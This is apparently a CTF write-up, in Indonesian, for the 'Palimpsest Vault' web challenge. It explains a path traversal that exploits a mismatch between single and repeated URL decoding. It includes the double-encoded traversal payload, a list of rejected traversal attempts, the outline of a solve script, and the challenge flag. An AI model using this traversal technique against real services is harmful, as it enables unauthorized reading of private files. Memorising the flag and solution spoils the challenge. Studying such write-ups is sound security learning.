# Palimpsest Vault

## Ringkasan

Bug ada di perbedaan cara validasi antara clerk dan renderer.

Clerk memvalidasi path sebelum menandatangani ticket. Dari clue `/docs/ink`, clerk hanya melakukan satu kali proses "warm pass". Renderer melakukan proses warm berulang sampai escape tidak berubah lagi, lalu baru mengikuti shelf path.

Payload yang dipakai:

```
/docs/welcome/..%252f..%252fprivate%252fflag%252fdummy/..
```

Path ini terlihat aman untuk clerk setelah satu kali decode, tetapi berubah menjadi traversal ke private shelf saat renderer melakukan decode berulang.

Flag:

```
0xV01D{palimpsest_ink_lied_to_the_gatekeeper}
```

## File Challenge

Challenge berbentuk web service:

```
http://35.192.106.100:21004/
```

Endpoint yang terlihat dari halaman utama:

```
/mint
/view
/catalogue.json
/.well-known/ink
```

Catalogue public hanya berisi folio di bawah `/docs`:

```json
{
  "/docs/welcome": "Welcome folio",
  "/docs/rules": "Clerk rules",
  "/docs/ink": "Transparent ink note",
  "/docs/decoy": "The wrong hidden shelf"
}
```

## Analisis Awal

Request normal ke `/mint?target=/docs/welcome` menghasilkan ticket signed:

```
ticket minted
clerk-saw: /docs/welcome
view: /view?ticket=...
```

Payload ticket berupa base64url JSON dan signature:

```json
{
  "iat": 1786845300,
  "scope": "folio:view",
  "target": "/docs/welcome"
}
```

Ticket tidak bisa diedit langsung karena ada signature. Jadi jalurnya bukan forge token, tapi membuat clerk menandatangani target yang akan dibaca berbeda oleh renderer.

## Analisis Static

Clue penting berasal dari endpoint `/.well-known/ink`:

```
palimpsest renderer note
- clerk: one warm pass, then stamp
- renderer: warm until escapes stop moving
- shelf marks are followed only after rendering
- the private shelf is not in the public catalogue
```

Clue lain dari `/docs/decoy`:

```
A previous apprentice tried /docs/../private/flag and got caught. The clerk understands obvious ladders.
```

Artinya traversal biasa seperti `/docs/../private/flag` ditolak oleh clerk. Yang dibutuhkan adalah traversal yang masih tersamarkan saat dicek clerk, tapi terbuka penuh saat dirender.

## Analisis Dynamic

Tes traversal biasa gagal:

```
/docs/../private/flag       -> NO TICKET
/docs/%2e%2e/private/flag   -> NO TICKET
/docs/welcome/../../flag    -> NO TICKET
```

Tetapi path seperti ini lolos:

```
/docs/welcome/../rules
```

Clerk menampilkan:

```
clerk-saw: /docs/rules
```

Namun payload ticket tetap menyimpan target mentah:

```json
{
  "target": "/docs/welcome/../rules"
}
```

Ini membuktikan bahwa clerk melakukan normalisasi untuk pengecekan, tetapi ticket menyimpan target original. Renderer kemudian memproses target original itu lagi.

## Algoritma Validasi atau Encoding

Payload exploit:

```
/docs/welcome/..%252f..%252fprivate%252fflag%252fdummy/..
```

Perbedaan decode:

```
Input mentah:
/docs/welcome/..%252f..%252fprivate%252fflag%252fdummy/..

Setelah satu warm pass oleh clerk:
/docs/welcome/..%2f..%2fprivate%2fflag%2fdummy/..
```

Pada tahap clerk, `%2f` belum menjadi slash path separator. Jadi bagian tersebut masih dianggap sebagai nama segmen, bukan traversal nyata. Karena ada `/..` di akhir, path bisa tetap dianggap aman dan ticket ditandatangani.

Renderer melakukan warm berulang:

```
%252f -> %2f -> /
```

Maka target berubah menjadi:

```
/docs/welcome/../../private/flag/dummy/..
```

Setelah path normalization:

```
/private/flag
```

Renderer akhirnya membuka private shelf dan menampilkan uncatalogued folio.

## Penyusunan Solve Script

`solve.py` melakukan langkah berikut:

1. Kirim request ke `/mint` dengan target exploit.
2. Ambil ticket dari response HTML.
3. Kirim ticket ke `/view`.
4. Bersihkan HTML response.
5. Ekstrak flag dengan regex.

Payload final:

```python
TARGET = "/docs/welcome/..%252f..%252fprivate%252fflag%252fdummy/.."
```

## Cara Menjalankan

```bash
python3 solve.py
```

Atau jika base URL berubah:

```bash
python3 solve.py http://35.192.106.100:21004
```

Output valid:

```
Uncatalogued folio
The old ink finally dries.
0xV01D{palimpsest_ink_lied_to_the_gatekeeper}
```

## Flag

```
0xV01D{palimpsest_ink_lied_to_the_gatekeeper}
```
